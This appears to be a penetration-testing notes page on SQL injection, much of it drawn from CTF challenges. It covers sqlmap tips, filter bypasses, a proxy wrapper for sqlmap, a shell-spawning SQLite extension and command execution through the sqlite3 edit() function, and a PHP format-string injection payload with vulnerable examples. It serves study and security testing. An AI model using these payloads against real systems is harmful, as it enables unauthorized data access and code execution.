---
description: >-
  An infamous and simple attack where code is injected where data should be,
  rewriting the SQL Query
---

# SQL Injection

## SQLMap

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap" %}

You can run a raw request through `sqlmap` with cookies and POST to find any injection:

```shell-session
$ sqlmap -r r.txt --batch
```

* `--level=5` tests more inputs, like HTTP headers
* `--risk=3` tests more injection payloads

### XSS/SQLi through SQL Injection

{% embed url="https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/intigriti-july-xss-challenge-0722" %}
Writeup showing XSS through a Second-Order injection (3-in-one)
{% endembed %}

Use `UNION SELECT` statements to alter the returned content on the site, with an XSS payload for example.

{% hint style="info" %}
Also try 'Second-Order' injection, by doing another injection inside of your `UNION` content if not all values can be altered (see the writeup above)
{% endhint %}

### Filter Bypass

Some scenarios where you can bypass character limits using functions or special syntax. \
&#xNAN;**`+`** here means supported in more than just the mentioned DB backend.

* Quotes (`'` & `"`) like `"j0r1an"`:&#x20;
  * Use `0x6a307231616e` in **MySQL**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Hex\('None',0\)Find_/_Replace\(%7B'option':'Regex','string':'.*'%7D,'0x$%26',false,false,false,false\)\&input=ajByMWFu)
  * Use [`char(106,48,114,49,97,110)`](https://www.sqlite.org/lang_corefunc.html#char) in **SQLite+**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Decimal\('Comma',false\)Find_/_Replace\(%7B'option':'Regex','string':'.*'%7D,'char\($%26\)',false,false,true,true\)\&input=ajByMWFu)

### Custom Wrapper (complex injections)

While most inputs are as simple as a query or body parameter, not all flows are like this. Interactions sometimes require special headers or formatting of the input, or the result of your action might only be visible on a different page. In these scenarios, SQLMap can fall short in its customization because it simply does not support everything.&#x20;

One clever solution to this is from a case where the hacker had to automate a blind SQL injection over a websocket. These are normally not possible in SQLMap, so you might think you need to create a custom script to extract all data slowly. While this is possible, an easier alternative is to **create a wrapper script** that makes it easy for SQLMap.&#x20;

{% embed url="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" %}
Writing a custom wrapper server for SQLMap to make exploitation easier
{% endembed %}

By creating a simple web server with a single query parameter as the payload, you can implement the full interaction in Python and then send back the result to SQLMap. You may do this for any kind of complex interaction with a server like this:

<pre class="language-python" data-title="proxy.py"><code class="lang-python">from flask import Flask, request
import requests

app = Flask(__name__)

def interact(payload):
    print(f"Payload: {payload}")
    # Example complex interaction
<strong>    requests.post("https://example.com/save", json={"input": payload})
</strong><strong>    r = requests.get("https://example.com/get_result")
</strong><strong>    return r.text
</strong>
@app.route('/')
def index():
    payload = request.args.get('id')
    return interact(payload)

if __name__ == '__main__':
    app.run(debug=False)
</code></pre>

Then run your server locally, and target _it_ instead of the regular target to proxy the traffic with your custom format and logic:

```bash
sqlmap -u 'http://localhost:5000/?id=1'
```

{% hint style="warning" %}
**Warning**: Performing this technique multiple times may make SQLMap cache results from a previous run because the same localhost URL is used. To ensure it starts completely fresh, clear the session every time using the `--flush-session` argument.
{% endhint %}

## SQLite

Tricks specific to the SQLite database backend.

### RCE through CLI

While looking through the documentation, you might notice functions that seem to have the ability to run arbitrary code on the system. The catch is that these methods are only possible using the `sqlite3` CLI tool by default, only with some very specific configuration will they be available through a normal library that uses the safer C-API behind the scenes.&#x20;

#### [`load_extension()`](https://www.sqlite.org/lang_corefunc.html#load_extension)

SQLite uses the C-API for all the heavy work, and the CLI as well as libraries are just wrappers over this. The `load_extension()` function is special as it can only be called after calling the `enable_load_extension()` function from the C-API, which is not available in SQL syntax. Fortunately, the **CLI enables this automatically** which means that if we are able to inject code into such a query, we can load extensions.&#x20;

These extensions are simply compiled C code in the form of `.so` files, with an init function:

<pre class="language-c" data-title="extension.c"><code class="lang-c">#include &#x3C;sqlite3ext.h>
SQLITE_EXTENSION_INIT1

#include &#x3C;stdlib.h>
#include &#x3C;unistd.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
  SQLITE_EXTENSION_INIT2(pApi);

<strong>  execve("/bin/sh", NULL, NULL);  // Spawn an interactive shell
</strong>
  return SQLITE_OK;
}
</code></pre>

```shell-session
$ gcc -s -g -fPIC -shared extension.c -o extension.so
```

Then from inside a CLI query, we can call the function with a path to the compiled extension:

<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select load_extension('./extension');
</strong>$ id
uid=1001(user) gid=1001(user) groups=1001(user)
</code></pre>

#### [`edit()`](https://www.sqlite.org/cli.html#the_edit_sql_function)

The CLI also includes an extra special function used for editing data interactively, which allows its 2nd argument to decide what command to run! It is very straightforward to exploit:

<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select edit(1,'id;');
</strong>uid=1001(user) gid=1001(user) groups=1001(user)
sh: 1: temp9385525e2ea5301f: not found
Error: EDITOR returned non-zero
</code></pre>

## Advanced

### Format strings

Even when the code you're looking at seems to be **correctly separating the SQL query from data** by using different arguments and placeholders, the underlying function may be insecurely turning both into a **single string** before it's sent to the database.

One thing that sometimes goes wrong is the ability to **inject placeholders** yourself in your values. An example of this can be found in the article below, where the code would iterate over all values, replacing them one by one. If your value contained a new placeholder the 2nd value would go into there instead by mistake. This confusion was enough to create an exploitable SQL Injection:

{% embed url="https://blog.lexfo.fr/magento-sqli.html" %}
Explaining example of a placeholder injection SQL Injection vulnerability (PHP)
{% endembed %}

When the developer uses an insecure combination of manual string concatenation and lets the library for format strings over that, you can once again inject placeholders (like `%s`) into the query.

{% code title="Vulnerable example" %}
```php
$username = strtr($_POST['username'], ['"' => '\\"', '\\' => '\\\\']);
$res = mysql_fquery($mysqli,
    'SELECT * FROM users WHERE username = "' . $username . '" AND password = "%s"',
    [$password]
);
```
{% endcode %}

&#x20;If the code relies on escaping/removing certain character like `'` to prevent SQL Injections, more complex placeholders like `%c` can turn a number (or a string casted to a number) into a single character through giving it a value with the 2nd input.\
To fix the issue of the format function receiving more placeholders than values, we can make our injected placeholder point to the 1st value specifically so it doesn't increase the total count, using `%1$c`.

* `username`: `%1$c OR 1=1;-- -`
* `password`: `34`

Together, this will turn into the following format string:

```php
$res = mysql_fquery($mysqli,
    'SELECT * FROM users WHERE username = "%1$c OR 1=1;-- -" AND password = "%s"',
    ["34"]
);
```

The `password` value (inside the array) needs to be placed into the format string. `%1$c` is replaced with the 1st element of the array, which is our `"34"` string, but because of the `c` is converted to a _character_ from an ASCII number. The 34th character is `"`, which is what it will be replaced with. The last `%s` also get substituted, and because the other format specifier was specific, this will be the first generic one and also take the 1st element of the array (our password).

```sql
SELECT * FROM users WHERE username = "" OR 1=1;-- -" AND password = "34"
```

{% embed url="https://www.justinsteven.com/posts/2023/09/10/ductf-2023-smooth-jazz-sqli/" %}
Writeup of the challenge using a novel technique of format strings in PHP
{% endembed %}

This same challenge includes another trick specific to MySQL, **truncating** the input in a SQL query using bytes outside of the ASCII range (0x80-0xff). It can be useful if your injection gets in the way in some other previous query, or in general if there's just a suffix you want to get rid of, when inserting or updating a value.

### PDO parser differentials (PHP)

In a similar situation to the previous, when you combine manual string concatenation with placeholders it can create scenario's where you can inject your own placeholders (like `?`).

{% code title="Vulnerable example" %}
```php
$pdo = new PDO("mysql:host=127.0.0.1;dbname=demo", 'root', '');

$col = '`' . str_replace('`', '``', $_GET['col']) . '`';

$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);
```
{% endcode %}

This alone is not enough to inject arbitrary statements, where the novelty comes in is using the fact that PDO specifically parses the query to find which placeholders are and aren't real, and in which context they are to put the values in. Because what you may not expect is that this `prepare()` method does **not actually use prepared statements** by default!

The writeup below shows a challenge where the solution involved finding a parser bug where a null byte (`%00`) was not recognized and could break the syntax. Check it out to understand in detail:

{% embed url="https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/" %}
Article introducing the technique and its details with examples
{% endembed %}

### Numbers without digits

Often with Blind SQL Injection you want to compare characters in a string to numbers using Binary Search to hone in on the value. In rare situations, however, you may not have the luxury of writing numbers. In these cases you can make use of the automatic casting of _booleans_ to numbers when adding or multiplying them.

`true` = 1, and `false` = 0. By adding true to itself `n` times, you get the number `n`, like `(true + true + true)` = 3. This gets repetitive for larger numbers, however, so we can do better by cleverly multiplying to get there.

An implementation of a dynamic programming algorithm is given below to find the most efficient expressions that evaluate to your target number:

<pre class="language-python"><code class="lang-python">def find_expressions(limit):
    """Source: https://chat.openai.com/share/2eb7a5cd-0980-4734-b897-acaf8e546969"""
    if limit == 0:
        return "false"
    if limit == 1:
        return "true"

    # Initialize a list to store the number of operations needed to reach each target
    min_operations = [float('inf')] * (limit + 1)
    min_operations[1] = 0  # Base case

    # Initialize a list to store the expression for each target
    expressions = ["false"] * (limit + 1)
    expressions[1] = "true"

    # Iterate through each number from 2 to target
    for i in range(2, limit + 1):
        # Try addition
        for j in range(1, i):
            if min_operations[j] + min_operations[i - j] + 1 &#x3C; min_operations[i]:
                min_operations[i] = min_operations[j] + \
                    min_operations[i - j] + 1
                expressions[i] = "(" + expressions[j] + \
                    "+" + expressions[i - j] + ")"

        # Try multiplication
        for j in range(2, int(i ** 0.5) + 1):
            if i % j == 0:
                if min_operations[j] + min_operations[i // j] + 1 &#x3C; min_operations[i]:
                    min_operations[i] = min_operations[j] + \
                        min_operations[i // j] + 1
                    expressions[i] = "(" + expressions[j] + \
                        "*" + expressions[i // j] + ")"

    return expressions

if __name__ == "__main__":
<strong>    expressions = find_expressions(256)
</strong><strong>    for c in 'Jorian':
</strong><strong>        print(f"{c} ({ord(c)}): {expressions[ord(c)]}")
</strong></code></pre>

{% code title="Example output" %}
```sql
J (74): ((true+true)*(true+((true+true)*((true+true)*((true+(true+true))*(true+(true+true)))))))
o (111): ((true+(true+true))*(true+((true+true)*((true+true)*((true+(true+true))*(true+(true+true)))))))
r (114): ((true+true)*((true+(true+true))*(true+((true+true)*((true+(true+true))*(true+(true+true)))))))
i (105): ((true+(true+true))*((true+(true+(true+(true+true))))*(true+((true+true)*(true+(true+true))))))
a (97): (true+((true+true)*((true+true)*((true+true)*((true+true)*((true+true)*(true+(true+true))))))))
n (110): ((true+true)*(true+((true+true)*((true+(true+true))*((true+(true+true))*(true+(true+true)))))))
```
{% endcode %}
